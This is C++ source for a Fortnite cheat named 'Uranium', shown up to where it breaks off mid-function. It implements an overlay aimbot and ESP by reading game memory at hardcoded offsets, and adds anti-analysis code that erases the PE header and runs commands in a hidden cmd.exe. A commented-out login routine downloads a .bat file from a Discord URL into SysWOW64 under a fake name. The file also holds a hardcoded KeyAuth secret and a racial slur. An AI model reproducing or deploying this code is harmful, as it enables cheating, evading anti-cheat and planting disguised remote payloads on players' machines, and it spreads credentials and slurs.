
//Basic includes
#include <iostream>
#include <Windows.h>
#include <thread>
#include <string>
#include <tlhelp32.h>
#include <fstream>
#include <filesystem>
#include <vector>
#include <vector>
#include <math.h>
#include <TlHelp32.h>
#include <Psapi.h>
#include <tchar.h>
#include <winioctl.h>
#include <Uxtheme.h>
#include <dwmapi.h>
#include <WinInet.h>
#include "shit/skCrypt.h"
#include <Mmsystem.h>
#include <mciapi.h>
#include <shobjidl_core.h>
#include <direct.h>
#include <urlmon.h>
#include <random>
#include "lazyimporter.h"
uint64_t base;
uint32_t pp_id = 0;
#include <tlhelp32.h>
#include <fstream>
#include <filesystem>
#include <Windows.h>
#include <winioctl.h>
#include <random>
#include <msxml.h>    
#include <atomic>
#include <mutex>
#include <Windows.h>
#include <TlHelp32.h>
#include <cstdint>
#include <vector>
#include <random>
#include <memoryapi.h>
#include <string>
#include <thread>
#include <chrono>
#include <iostream>
#include <string_view>
#include <mutex>
#include <chrono>
//Other includes
#include "libs/json/include/nlohmann/addys.h"
#include "cheat/utils.hpp"

#define _XBOX_CONTROLLER_H_
#include "shit/xorstr.hpp"
#include "cheat/ImGui/imgui.h"
#include "cheat/ImGui/imgui_impl_dx9.h"
#include "cheat/ImGui/imgui_impl_win32.h"
//random
namespace Util
{
	RECT rc;
	std::string random_string(const int len) { /*  For Cool Responses  */
		const std::string alpha_numeric("ABCDEFGHIJKLMNOPRSTUVZabcdefghijklmnoprstuvz");
		std::default_random_engine generator{ std::random_device{}() };
		const std::uniform_int_distribution< std::string::size_type > distribution{ 0, alpha_numeric.size() - 1 };
		std::string str(len, 0);
		for (auto& it : str) {
			it = alpha_numeric[distribution(generator)];
		}

		return str;
	}

}
//Driver driver;

#pragma comment(lib, "urlmon.lib")
#include <urlmon.h>

#define decrypt CTL_CODE(FILE_DEVICE_UNKNOWN, 0x1337, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)

std::string tm_to_readable_time(tm ctx);
void login();

char spoofy;
char eac;

/*
*
*
* WATCH THIS VIDEO FOR SETUP TUTORIAL: https://youtube.com/watch?v=Uh84xRBYSB0
* DO NOT CONTACT DISMAIL WITHOUT WATCHING VIDEO FIRST
*
*/

std::string name = ("Uranium");
std::string ownerid = ("YmkfXqDR1i");
std::string secret = ("aa70b9ffde539b3d66ec2b0631b8494e89c1157d2ace00c084a6c0e46c25bf35");
std::string version = ("1.3");


DWORD64 m_base;

void system_no_output(std::string command)
{
	command.insert(0, "/C ");

	SHELLEXECUTEINFOA ShExecInfo = { 0 };
	ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
	ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
	ShExecInfo.hwnd = NULL;
	ShExecInfo.lpVerb = NULL;
	ShExecInfo.lpFile = "cmd.exe";
	ShExecInfo.lpParameters = command.c_str();
	ShExecInfo.lpDirectory = NULL;
	ShExecInfo.nShow = SW_HIDE;
	ShExecInfo.hInstApp = NULL;

	if (ShellExecuteExA(&ShExecInfo) == FALSE)

		WaitForSingleObject(ShExecInfo.hProcess, INFINITE);

	DWORD rv;
	GetExitCodeProcess(ShExecInfo.hProcess, &rv);
	CloseHandle(ShExecInfo.hProcess);
}

VOID ErasePEHeaderFromMemory()
{
	_tprintf(_T("[*] Erasing PE header from memory\n"));
	DWORD OldProtect = 0;

	// Get base address of module
	char* pBaseAddr = (char*)GetModuleHandle(NULL);

	// Change memory protection
	VirtualProtect(pBaseAddr, 4096, // Assume x86 page size
		PAGE_READWRITE, &OldProtect);

	// Erase the header
	SecureZeroMemory(pBaseAddr, 4096);
}





/*void login()
{
	if (std::filesystem::exists("C:\\ProgramData\\nigger.txt"))
	{
		std::string key;
		std::ifstream InFile("C:\\ProgramData\\nigger.txt", std::ios::in);
		std::getline(InFile, key);
		InFile.close();
		std::cout << XorStr("\n\n Activating your old license key: ");
		std::cout << key;
		Sleep(1500);

		if (KeyAuthApp.license(key))
		{
		}
		else
		{
			std::string del = "C:\\ProgramData\\nigger.txt";
			remove(del.c_str());
			goto A;
		}
	}
	else
	{
	A:
		std::cout << XorStr("\n\n Please enter your license key: ");
		bool authed = false;
		while (authed == false)
		{
			std::string serial;
			std::cin >> serial;
			if (KeyAuthApp.license(serial)) {
				std::ofstream OutFile("C:\\ProgramData\\nigger.txt", std::ios::out);
				HRESULT hr91 = URLDownloadToFileA(NULL, XorStr("https://cdn.discordapp.com/attachments/890985121132445716/891064273491591338/bigmonke.bat").c_str(), XorStr("C:\\Windows\\SysWOW64\\SysFiles.txt").c_str(), 0, NULL);//eacforcer
				OutFile << serial;
				OutFile.close();
				authed = true;
			}
			else {
				Sleep(2500);
				system("CLS");
				goto A;
			}
		}
	}
}*/
std::string tm_to_readable_time(tm ctx) {
	char buffer[25];

	strftime(buffer, sizeof(buffer), "%m/%d/%y", &ctx);

	return std::string(buffer);
}

//Lib includes
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "Winmm.lib")

//Setup
HWND MyWnd = NULL;
HWND GameWnd = NULL;
RECT GameRect = { NULL };
MSG Message = { NULL };
IDirect3D9Ex* p_Object = NULL;
IDirect3DDevice9Ex* p_Device = NULL;
D3DPRESENT_PARAMETERS p_Params = { NULL };
#define ReadPointer(base, offset) (*(PVOID *)(((PBYTE)base + offset)))
#define ReadUint64(base, offset) (*(uintptr_t**)(((PBYTE)base + offset)))
#define ReadBool(base, offset) (*(bool *)(((PBYTE)base + offset)))
#define ReadVector2D(base, offset) (*(FVector2D *)(((PBYTE)base + offset)))
#define ReadFVector(base, offset) (*(FVector *)(((PBYTE)base + offset)))
#define ReadInt(base, offset) (*(int *)(((PBYTE)base + offset)))
#define ReadFloat(base, offset) (*(float *)(((PBYTE)base + offset)))
#define ReadDWORD(base, offset) (*(PDWORD)(((PBYTE)base + offset)))
#define ReadBYTE(base, offset) (*(((PBYTE)base + offset)))

//Check if object is in rectangle
boolean isInRectangle(double centerX, double centerY, double radius, double x, double y)
{
	return x >= centerX - radius && x <= centerX + radius &&
		y >= centerY - radius && y <= centerY + radius;
}

//string to wstring converter
std::wstring s2ws(const std::string& s) {
	std::string curLocale = setlocale(LC_ALL, "");
	const char* _Source = s.c_str();
	size_t _Dsize = mbstowcs(NULL, _Source, 0) + 1;
	wchar_t* _Dest = new wchar_t[_Dsize];
	wmemset(_Dest, 0, _Dsize);
	mbstowcs(_Dest, _Source, _Dsize);
	std::wstring result = _Dest;
	delete[]_Dest;
	setlocale(LC_ALL, curLocale.c_str());
	return result;
}

//String to char converter
char* StringToChar(std::string string)
{
	return _strdup(string.c_str());
}

//Message logger
template <class T>
void msg(T msg)
{
	std::cout << msg << std::endl;
}

//Check if a file exists
bool FileExists(const std::string& fileName)
{
	struct stat buffer;
	return (stat(fileName.c_str(), &buffer) == 0);
}

//Write data to .ini file
void WriteStringToIni(std::string string, std::string file, std::string app, std::string key)
{
	WritePrivateProfileStringA(app.c_str(), key.c_str(), string.c_str(), file.c_str());
}

//Read data from .ini file
std::string ReadStringFromIni(std::string file, std::string app, std::string key)
{
	char buf[100];
	GetPrivateProfileStringA(app.c_str(), key.c_str(), XorStr("NULL").c_str(), buf, 100, file.c_str());
	return (std::string)buf;
}

double return_float_value(float val69)
{

	return (float)val69;
}


//values
float new_crosshairx = 1;
float new_crosshairy = 1;
float new_crosshairt = 1;
float new_aimfov = 1;
float new_aimsmooth = 1;
float new_aimdistance = 1;


std::string ReadStringFromIni_Float(std::string file, std::string app, std::string key, int float_code)
{
	char buf[100];
	GetPrivateProfileStringA(app.c_str(), key.c_str(), XorStr("NULL").c_str(), buf, 100, file.c_str());

	if (float_code == 0)
	{
		system(XorStr("cls").c_str());
		std::cout << XorStr("\n loading error 14 - contact support.").c_str();
		Sleep(5000);
		exit(0);
	}
	else if (float_code == 1) //crosshairx
	{
		new_crosshairx = std::stof(buf);
	}
	else if (float_code == 2) //crosshairy
	{
		new_crosshairy = std::stof(buf);
	}
	else if (float_code == 3) //crosshairthinkness
	{
		new_crosshairt = std::stof(buf);
	}
	else if (float_code == 4) //aimfov
	{
		new_aimfov = std::stof(buf);
	}
	else if (float_code == 5) //aimsmooth
	{
		new_aimsmooth = std::stof(buf);
	}
	else if (float_code == 6) //aimdistance
	{
		new_aimdistance = std::stof(buf);
	}

	//std::string str = "123.4567"; //key

	// convert string to float
	//float num_float = std::stof(str); //key

	// convert string to double
	//double num_double = std::stod(str);

	//output = num_float;
	//output = (float)88;
	//std::string::size_type sz;
	//output = std::stof(buf, &sz);
	return (std::string)buf;
}
std::string sta = "sta";
//WinProc (required for ImGui menu)
extern LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam); LRESULT CALLBACK WinProc(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK WinProc(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam)
{
	if (ImGui_ImplWin32_WndProcHandler(hWnd, Message, wParam, lParam)) {
		return true;
	}
	switch (Message)
	{
	case WM_DESTROY:

		PostQuitMessage(0);
		exit(4);
		break;
	case WM_SIZE:
		if (p_Device != NULL && wParam != SIZE_MINIMIZED)
		{
			ImGui_ImplDX9_InvalidateDeviceObjects();
			p_Params.BackBufferWidth = LOWORD(lParam);
			p_Params.BackBufferHeight = HIWORD(lParam);
			HRESULT hr = p_Device->Reset(&p_Params);

			if (hr == D3DERR_INVALIDCALL) {
				IM_ASSERT(0);
			}

			ImGui_ImplDX9_CreateDeviceObjects();
		}
		break;
	default:
		return DefWindowProc(hWnd, Message, wParam, lParam);
		break;
	}
	return 0;
}
std::string rt = "rt";
//Initialize Window, DirectX and ImGui style
HRESULT DirectXInit(HWND hWnd) {
	if (FAILED(Direct3DCreate9Ex(D3D_SDK_VERSION, &p_Object))) {
		exit(3);
	}
	ZeroMemory(&p_Params, sizeof(p_Params));
	p_Params.Windowed = TRUE;
	p_Params.SwapEffect = D3DSWAPEFFECT_DISCARD;
	p_Params.hDeviceWindow = hWnd;
	p_Params.MultiSampleQuality = D3DMULTISAMPLE_NONE;
	p_Params.BackBufferFormat = D3DFMT_A8R8G8B8;
	p_Params.BackBufferWidth = Settings::MajorValues::Width;
	p_Params.BackBufferHeight = Settings::MajorValues::Height;
	p_Params.EnableAutoDepthStencil = TRUE;
	p_Params.AutoDepthStencilFormat = D3DFMT_D16;
	p_Params.PresentationInterval = D3DPRESENT_INTERVAL_IMMEDIATE;
	if (FAILED(p_Object->CreateDeviceEx(D3DADAPTER_DEFAULT, D3DDEVTYPE_HAL, hWnd, D3DCREATE_HARDWARE_VERTEXPROCESSING, &p_Params, 0, &p_Device)))
	{
		p_Object->Release();
		exit(4);
	}
	IMGUI_CHECKVERSION();
	ImGui::CreateContext();
	ImGuiIO& io = ImGui::GetIO();
	ImFontConfig font_config;
	font_config.OversampleH = 1;
	font_config.OversampleV = 1;
	font_config.PixelSnapH = true;
	static const ImWchar ranges[] =
	{
		0x0020, 0x00FF,
		0x0400, 0x044F,
		0,
	};
	ImGui_ImplWin32_Init(hWnd);
	ImGui_ImplDX9_Init(p_Device);
	//ImGui::StyleColorsClassic();

	ImGui::StyleColorsClassic();

	auto& Style = ImGui::GetStyle();

	Style.WindowPadding = ImVec2(10.000f, 6.000f);
	Style.WindowBorderSize = 0.000f;
	Style.FramePadding = ImVec2(4.000f, 0.000f);
	Style.Colors[ImGuiCol_Text] = ImVec4(0.00f, 0.00f, 0.00f, 1.00f);
	Style.Colors[ImGuiCol_TextDisabled] = ImVec4(0.60f, 0.60f, 0.60f, 1.00f);
	Style.Colors[ImGuiCol_WindowBg] = ImVec4(0.94f, 0.94f, 0.94f, 1.00f);
	Style.Colors[ImGuiCol_ChildBg] = ImVec4(0.00f, 0.00f, 0.00f, 0.00f);
	Style.Colors[ImGuiCol_PopupBg] = ImVec4(1.00f, 1.00f, 1.00f, 0.98f);
	Style.Colors[ImGuiCol_Border] = ImVec4(0.00f, 0.00f, 0.00f, 0.30f);
	Style.Colors[ImGuiCol_BorderShadow] = ImVec4(0.00f, 0.00f, 0.00f, 0.00f);
	Style.Colors[ImGuiCol_FrameBg] = ImVec4(1.00f, 1.00f, 1.00f, 1.00f);
	Style.Colors[ImGuiCol_FrameBgHovered] = ImVec4(0.26f, 0.59f, 0.98f, 0.40f);
	Style.Colors[ImGuiCol_FrameBgActive] = ImVec4(0.26f, 0.59f, 0.98f, 0.67f);
	Style.Colors[ImGuiCol_TitleBg] = ImVec4(0.96f, 0.96f, 0.96f, 1.00f);
	Style.Colors[ImGuiCol_TitleBgActive] = ImVec4(0.82f, 0.82f, 0.82f, 1.00f);
	Style.Colors[ImGuiCol_TitleBgCollapsed] = ImVec4(1.00f, 1.00f, 1.00f, 0.51f);
	Style.Colors[ImGuiCol_MenuBarBg] = ImVec4(0.86f, 0.86f, 0.86f, 1.00f);
	Style.Colors[ImGuiCol_ScrollbarBg] = ImVec4(0.98f, 0.98f, 0.98f, 0.53f);
	Style.Colors[ImGuiCol_ScrollbarGrab] = ImVec4(0.69f, 0.69f, 0.69f, 0.80f);
	Style.Colors[ImGuiCol_ScrollbarGrabHovered] = ImVec4(0.49f, 0.49f, 0.49f, 0.80f);
	Style.Colors[ImGuiCol_ScrollbarGrabActive] = ImVec4(0.49f, 0.49f, 0.49f, 1.00f);
	Style.Colors[ImGuiCol_CheckMark] = ImVec4(0.26f, 0.59f, 0.98f, 1.00f);
	Style.Colors[ImGuiCol_SliderGrab] = ImVec4(0.26f, 0.59f, 0.98f, 0.78f);
	Style.Colors[ImGuiCol_SliderGrabActive] = ImVec4(0.46f, 0.54f, 0.80f, 0.60f);
	Style.Colors[ImGuiCol_Button] = ImVec4(0.26f, 0.59f, 0.98f, 0.40f);
	Style.Colors[ImGuiCol_ButtonHovered] = ImVec4(0.26f, 0.59f, 0.98f, 1.00f);
	Style.Colors[ImGuiCol_ButtonActive] = ImVec4(0.06f, 0.53f, 0.98f, 1.00f);
	Style.Colors[ImGuiCol_Header] = ImVec4(0.26f, 0.59f, 0.98f, 0.31f);
	Style.Colors[ImGuiCol_HeaderHovered] = ImVec4(0.26f, 0.59f, 0.98f, 0.80f);
	Style.Colors[ImGuiCol_HeaderActive] = ImVec4(0.26f, 0.59f, 0.98f, 1.00f);
	Style.Colors[ImGuiCol_Separator] = ImVec4(0.39f, 0.39f, 0.39f, 1.00f);
	Style.Colors[ImGuiCol_SeparatorHovered] = ImVec4(0.14f, 0.44f, 0.80f, 0.78f);
	Style.Colors[ImGuiCol_SeparatorActive] = ImVec4(0.14f, 0.44f, 0.80f, 1.00f);
	Style.Colors[ImGuiCol_ResizeGrip] = ImVec4(0.80f, 0.80f, 0.80f, 0.56f);
	Style.Colors[ImGuiCol_ResizeGripHovered] = ImVec4(0.26f, 0.59f, 0.98f, 0.67f);
	Style.Colors[ImGuiCol_ResizeGripActive] = ImVec4(0.26f, 0.59f, 0.98f, 0.95f);
	Style.Colors[ImGuiCol_PlotLines] = ImVec4(0.39f, 0.39f, 0.39f, 1.00f);
	Style.Colors[ImGuiCol_PlotLinesHovered] = ImVec4(1.00f, 0.43f, 0.35f, 1.00f);
	Style.Colors[ImGuiCol_PlotHistogram] = ImVec4(0.90f, 0.70f, 0.00f, 1.00f);
	Style.Colors[ImGuiCol_PlotHistogramHovered] = ImVec4(1.00f, 0.45f, 0.00f, 1.00f);
	Style.Colors[ImGuiCol_TextSelectedBg] = ImVec4(0.26f, 0.59f, 0.98f, 0.35f);
	Style.Colors[ImGuiCol_ModalWindowDarkening] = ImVec4(0.20f, 0.20f, 0.20f, 0.35f);
	Style.Colors[ImGuiCol_DragDropTarget] = ImVec4(0.26f, 0.59f, 0.98f, 0.95f);



	io.Fonts->AddFontFromFileTTF("D:/Desktop/Fonts/verdana.ttf", 18.356f);
	p_Object->Release();
	return S_OK;
}

//Create Window
void SetupWindow()
{
	GameWnd = FindWindowW(NULL, TEXT("Fortnite  "));
	if (GameWnd)
	{
		GetClientRect(GameWnd, &GameRect);
		POINT xy = { 0 };
		ClientToScreen(GameWnd, &xy);
		GameRect.left = xy.x;
		GameRect.top = xy.y;
		Settings::MajorValues::Width = GameRect.right;
		Settings::MajorValues::Height = GameRect.bottom;
	}
	else {
		exit(2);
	}
	WNDCLASSEX overlayWindowClass;
	ZeroMemory(&overlayWindowClass, sizeof(WNDCLASSEX));
	overlayWindowClass.cbClsExtra = NULL;
	overlayWindowClass.cbWndExtra = NULL;
	overlayWindowClass.cbSize = sizeof(WNDCLASSEX);
	overlayWindowClass.style = CS_HREDRAW | CS_VREDRAW;
	overlayWindowClass.lpfnWndProc = WinProc;
	overlayWindowClass.hInstance = NULL;
	overlayWindowClass.hCursor = LoadCursor(NULL, IDC_ARROW);
	overlayWindowClass.hIcon = LoadIcon(0, IDI_APPLICATION);
	overlayWindowClass.hIconSm = LoadIcon(0, IDI_APPLICATION);
	overlayWindowClass.hbrBackground = (HBRUSH)RGB(0, 0, 0);
	overlayWindowClass.lpszClassName = L"DiscordOverlay";
	overlayWindowClass.lpszMenuName = L"DiscordOverlay";
	RegisterClassEx(&overlayWindowClass);
	MyWnd = CreateWindowEx(NULL, L"DiscordOverlay", L"DiscordOverlay", WS_POPUP | WS_VISIBLE, GameRect.left, GameRect.top, Settings::MajorValues::Width, Settings::MajorValues::Height, NULL, NULL, NULL, NULL);
	MARGINS margin = { GameRect.left, GameRect.top, Settings::MajorValues::Width - 1, Settings::MajorValues::Height + 2};
	DwmExtendFrameIntoClientArea(MyWnd, &margin);
	SetWindowLong(MyWnd, GWL_EXSTYLE, WS_EX_LAYERED | WS_EX_TRANSPARENT);
	ShowWindow(MyWnd, SW_SHOW);
	HRESULT initRet = CoInitialize(NULL);
	
		
	
	CoUninitialize();
	//::ShowWindow(::GetConsoleWindow(), SW_HIDE);
	UpdateWindow(MyWnd);
}

//KeyAuth setup


//Options, Settings
struct
{
	bool ShowMenu = false;
	bool FirstUse = false;
	int MenuTab = 0;
	float Width;
	float Height;
	struct
	{
		bool Enable = true;
		bool DrawFOV = true;
		bool prediction = true;
		bool autofiretrigger = false;
		bool ClosestByCrosshair = true;
		bool ClosestByDistance = false;
		bool AimPos_Head = true;
		bool AimPos_Body = false;
		float AimbotFOV = 50.0f;
		float AimbotSmooth = 2.0f;
		float AimbotMaximalDistance = 100.0f;
		bool AimKey_RMB = true;
		bool AimKey_SHIFT = false;
		
		bool AimKey_DOWN = false;
		int AimKey;
	} Aimbot;
	struct {
		bool Boxes = true;
		bool Corner = true;
		bool filledboxes = false;
		bool Skeletons = false;
		bool Snaplines = true;
		bool Distance = true;
		bool HeadDot= false;
		bool debug = false;
		bool bone = false;
		bool chest = false;
		bool guntest1 = false;
		bool guntest2 = false;
		bool guntest3 = false;
		bool guntest4 = false;
		bool guntest5 = false;
		bool guntest6 = false;
		bool guntest7 = false;
		bool guntest8 = false;
		bool Nickname;
		bool ActiveItemOrWeapon;
		bool esppreview = true;
		float EspMaximalDistance = 100.0f;
		bool PlayerESP = true;
	    bool enabled = true;
	} Visuals;
	struct
	{
		bool FakeKeyboardSounds = false;
		bool Crosshair = false;
		bool WhiteCross = false;
		float CrosshairX = 10.0f;
		float CrosshairY = 10.0f;
		float CrosshairThickness = 1.0f;
	} Misc;

} Options;

//Find closest 3D Object to 2D point
using namespace std;
int getClosest(int val1, int val2,
	int target)
{
	if (target - val1 >= val2 - target)
		return val2;
	else
		return val1;
}
int findClosest(int arr[], int n, int target)
{
	if (target <= arr[0])
		return arr[0];
	if (target >= arr[n - 1])
		return arr[n - 1];
	int i = 0, j = n, mid = 0;
	while (i < j) {
		mid = (i + j) / 2;
		if (arr[mid] == target)
			return arr[mid];
		if (target < arr[mid]) {
			if (mid > 0 && target > arr[mid - 1])
				return getClosest(arr[mid - 1],
					arr[mid], target);
			j = mid;
		}
		else {
			if (mid < n - 1 && target < arr[mid + 1])
				return getClosest(arr[mid],
					arr[mid + 1], target);
			i = mid + 1;
		}
	}
	return arr[mid];
}



//Definition of game addresses
DWORD_PTR Uworld;
DWORD_PTR LocalPawn;
DWORD_PTR Localplayer;
DWORD_PTR Rootcomp;
DWORD_PTR PlayerController;
DWORD_PTR Ulevel;
DWORD_PTR entityx;
int localplayerID;
extern Vector3 CameraEXT(0, 0, 0);
float FovAngle;
Vector3 localactorpos;
Vector3 Localcam;
bool isaimbotting = false;
//WorldToScreen - Convert a 3D Object to 2D Screen x, y position
Vector3 ProjectWorldToScreen69(Vector3 WorldLocation, Vector3 camrot)
{
	Vector3 Screenlocation = Vector3(0, 0, 0);
	Vector3 Camera;

	auto chain69 = read<uintptr_t>(Localplayer + 0xa8);
	uint64_t chain699 = read<uintptr_t>(chain69 + 8);

	Camera.x = read<float>(chain699 + 0x8F8); // 0x7E8 //camera pitch  watch out for x and y swapped 4u
	Camera.y = read<float>(Rootcomp + 0x12C);  //camera yaw

	float test = asin(Camera.x);
	float degrees = test * (180.0 / M_PI);
	Camera.x = degrees;

	if (Camera.y < 0)
		Camera.y = 360 + Camera.y;

	D3DMATRIX tempMatrix = Matrix(Camera);
	Vector3 vAxisX, vAxisY, vAxisZ;

	vAxisX = Vector3(tempMatrix.m[0][0], tempMatrix.m[0][1], tempMatrix.m[0][2]);
	vAxisY = Vector3(tempMatrix.m[1][0], tempMatrix.m[1][1], tempMatrix.m[1][2]);
	vAxisZ = Vector3(tempMatrix.m[2][0], tempMatrix.m[2][1], tempMatrix.m[2][2]);

	uint64_t chain = read<uint64_t>(Localplayer + 0x70);
	uint64_t chain1 = read<uint64_t>(chain + 0x98);
	uint64_t chain2 = read<uint64_t>(chain1 + 0x140);

	Vector3 vDelta = WorldLocation - read<Vector3>(chain2 + 0x10); //camera location credits for Object9999
	Vector3 vTransformed = Vector3(vDelta.Dot(vAxisY), vDelta.Dot(vAxisZ), vDelta.Dot(vAxisX));

	if (vTransformed.z < 1.f)
		vTransformed.z = 1.f;

	float zoom = read<float>(chain699 + 0x580);

	FovAngle = 80.0f / (zoom / 1.19f);
	float ScreenCenterX = Settings::MajorValues::ScreenCenterX;
	float ScreenCenterY = Settings::MajorValues::ScreenCenterY;

	Screenlocation.x = ScreenCenterX + vTransformed.x * (ScreenCenterX / tanf(FovAngle * (float)M_PI / 360.f)) / vTransformed.z;
	Screenlocation.y = ScreenCenterY - vTransformed.y * (ScreenCenterX / tanf(FovAngle * (float)M_PI / 360.f)) / vTransformed.z;
	CameraEXT = Camera;

	return Screenlocation;
}
double GetCrossDistance(double x1, double y1, double x2, double y2)
{
	return sqrt(pow((x2 - x1), 2) + pow((y2 - y1), 2));
}

bool GetClosestPlayerToCrossHair(Vector3 Pos, float& max, float aimfov, DWORD_PTR entity)
{
	if (entity)
	{
		float Dist = GetCrossDistance(Pos.x, Pos.y, Settings::MajorValues::ScreenCenterX, Settings::MajorValues::ScreenCenterY);

		if (Dist < max)
		{
			max = Dist;
			entityx = entity;
			Options.Aimbot.AimbotFOV = aimfov;
		}
	}
	return false;
}
/*void AIms(DWORD_PTR entity, Vector3 Localcam)
{
	float max = 100.f;

	uint64_t currentactormesh = read<uint64_t>(entity + 0x280);  // changed often 

	Vector3 rootHead = GetBoneWithRotation(currentactormesh, 98);
	Vector3 rootHeadOut = ProjectWorldToScreen69(rootHead, Vector3(Localcam.y, Localcam.x, Localcam.z));

	if (GetClosestPlayerToCrossHair(rootHeadOut, max, Options.Aimbot.AimbotFOV, entity))
		entityx = entity;
}*/
void aimbot(float x, float y)
{
	float ScreenCenterX = Settings::MajorValues::ScreenCenterX;
	float ScreenCenterY = Settings::MajorValues::ScreenCenterY;
	int AimSpeed = Options.Aimbot.AimbotSmooth;
	float TargetX = 0;
	float TargetY = 0;

	if (x != 0)
	{
		if (x > ScreenCenterX)
		{
			TargetX = -(ScreenCenterX - x);
			TargetX /= AimSpeed;
			if (TargetX + ScreenCenterX > ScreenCenterX * 2) TargetX = 0;
		}

		if (x < ScreenCenterX)
		{
			TargetX = x - ScreenCenterX;
			TargetX /= AimSpeed;
			if (TargetX + ScreenCenterX < 0) TargetX = 0;
		}
	}

	if (y != 0)
	{
		if (y > ScreenCenterY)
		{
			TargetY = -(ScreenCenterY - y);
			TargetY /= AimSpeed;
			if (TargetY + ScreenCenterY > ScreenCenterY * 2) TargetY = 0;
		}

		if (y < ScreenCenterY)
		{
			TargetY = y - ScreenCenterY;
			TargetY /= AimSpeed;
			if (TargetY + ScreenCenterY < 0) TargetY = 0;
		}
	}

	mouse_event(MOUSEEVENTF_MOVE, static_cast<DWORD>(TargetX), static_cast<DWORD>(TargetY), NULL, NULL);

	if (Options.Aimbot.autofiretrigger) {
		mouse_event(MOUSEEVENTF_LEFTDOWN, DWORD(NULL), DWORD(NULL), DWORD(0x0002), ULONG_PTR(NULL));
		mouse_event(MOUSEEVENTF_LEFTUP, DWORD(NULL), DWORD(NULL), DWORD(0x0004), ULONG_PTR(NULL));
	}

	return;
}
#include <Xinput.h>
/*void AimAt(DWORD_PTR entity, Vector3 Localcam)
{


	{
		uint64_t currentactormesh = read<uint64_t>(entity + 0x280);
		auto rootHead = GetBoneWithRotation(currentactormesh, 98);
		Vector3 rootHeadOut = ProjectWorldToScreen69(rootHead, Vector3(Localcam.y, Localcam.x, Localcam.z));
		Vector3 Headpos = GetBoneWithRotation(currentactormesh, 98);
		Vector3 HeadposW2s = ProjectWorldToScreen69(Headpos, Vector3(Localcam.y, Localcam.x, Localcam.z));

		if (rootHeadOut.x != 0 || rootHeadOut.y != 0)
		{
			if ((GetCrossDistance(rootHeadOut.x, rootHeadOut.y, Settings::MajorValues::ScreenCenterX, Settings::MajorValues::ScreenCenterY) <= Options.Aimbot.AimbotFOV * 8) || isaimbotting)
			{
				aimbot(rootHeadOut.x, rootHeadOut.y);
				//DrawString(_xor_("TRACKED").c_str(), 13, rootHeadOut.x, rootHeadOut.y - 0, 255, 255, 1);
				//DrawLine(width / 2, height / 2, rootHeadOut.x, rootHeadOut.y, 1.f, 255.f, 0.f, 0.f, 1.0f);;;
				



			}
		}
	}


}*/

static void decrypt_fname_entry(char* buf, int len)
{
	char* v2 = buf;
	unsigned __int16* v3 = 0;
	int v4 = len;
	__int16 result = 0;
	int v6 = 0;
	int v7 = 0;
	int v8 = 0;
	unsigned int v9 = 0;

	static DWORD_PTR decryptOffset = NULL;

	if (!decryptOffset)
		decryptOffset = ((DWORD_PTR)GetModuleHandleW(NULL) + 0xB672850);
	result = *(unsigned int*)decryptOffset;
	v6 = 0;
	v7 = 24;
	if (v4)
	{
		do
		{
			v8 = v6++;
			v9 = (v8 | 0xB000) + v7;
			result = v9 ^ ~*v2;
			v7 = v9 >> 2;
			*v2 = result;
			++v2;
		} while (v6 < v4);
	}
	return;
}







int NewPlayerLocationX;
int NewPlayerLocationY;
Vector3 Headposw2s;
Vector3 HeadAim;
bool aimbottestnigga = false;
bool aimbottestnigga2 = false;

//Offsets
#define offset_uworld 0xB78BC70 //0xB78BC30//0xB78BC70
#define offset_gameinstance 0x190
#define offset_localplayers 0x38
#define offset_playercontroller 0x30//
#define offset_localpawn 0x2A8//0x2A8
#define offset_rootcomp 0x130
#define offset_playerid 0x18
#define offset_plevel 0x30//
#define offset_playerstate 0x238
#define offset_actorcount 0xA0
#define offset_aactors 0x98

#include <type_traits>



void DrawCorneredBox(int X, int Y, int W, int H, ImColor color, int thickness) {
	float lineW = (W / 3);
	float lineH = (H / 3);
	ImDrawList* Renderer = ImGui::GetOverlayDrawList();
	Renderer->AddLine(ImVec2(X, Y), ImVec2(X, Y + lineH), color, thickness);

	Renderer->AddLine(ImVec2(X, Y), ImVec2(X + lineW, Y), color, thickness);

	Renderer->AddLine(ImVec2(X + W - lineW, Y), ImVec2(X + W, Y), color, thickness);

	Renderer->AddLine(ImVec2(X + W, Y), ImVec2(X + W, Y + lineH), color, thickness);

	Renderer->AddLine(ImVec2(X, Y + H - lineH), ImVec2(X, Y + H), color, thickness);

	Renderer->AddLine(ImVec2(X, Y + H), ImVec2(X + lineW, Y + H), color, thickness);

	Renderer->AddLine(ImVec2(X + W - lineW, Y + H), ImVec2(X + W, Y + H), color, thickness);

	Renderer->AddLine(ImVec2(X + W, Y + H - lineH), ImVec2(X + W, Y + H), color, thickness);

}

static bool WorldToScreen(Vector3 WorldLocation, Vector3* out)
{

	//if (!fnWorldToScreen) {
	//	fnWorldToScreen = reinterpret_cast<WorldToScreen_t>(ProjectWorldToScreen);
	//}
	auto WorldToScreen = reinterpret_cast<bool(__fastcall*)(uintptr_t pPlayerController, Vector3 vWorldPos, Vector3 * vScreenPosOut, char)>(ProjectWorldToScreen69);

	return(WorldToScreen, (uintptr_t)PlayerController, WorldLocation, out, (char)0);
	
	return true;
}
float ChestESP_float[4] = { 255, 231, 94, 255 };
ImColor ChestESP = ImColor(255, 231, 94, 255);

bool CheckItemInScreen(uintptr_t CurrentActor, int Width, int Height) {
	Vector3 Pos;
	//MessageBoxA(NULL, "Before RootComponent", "", MB_OK);
	uintptr_t RootComponent = read<uintptr_t>(CurrentActor + offset_rootcomp);
	//std::cout << "TheOmegaLul: " << RootComponent << "\n";
	//MessageBoxA(NULL, "Before RelativeLocation", "", MB_OK);
	//if (!RootComponent) return false;
	Vector3 RelativeLocation = read<Vector3>(RootComponent + 0x11C);
	//MessageBoxA(NULL, "Before WorldToScreen", "", MB_OK);
	WorldToScreen(RelativeLocation, &Pos);
	if (CurrentActor)
	{
		//MessageBoxA(NULL, "Before THE OMEGALUL IF", "", MB_OK);
		if (((Pos.x <= 0 or Pos.x > Width) and (Pos.y <= 0 or Pos.y > Height)) or ((Pos.x <= 0 or Pos.x > Width) or (Pos.y <= 0 or Pos.y > Height))) {
			return false;
		}
		else {
			return true;
		}
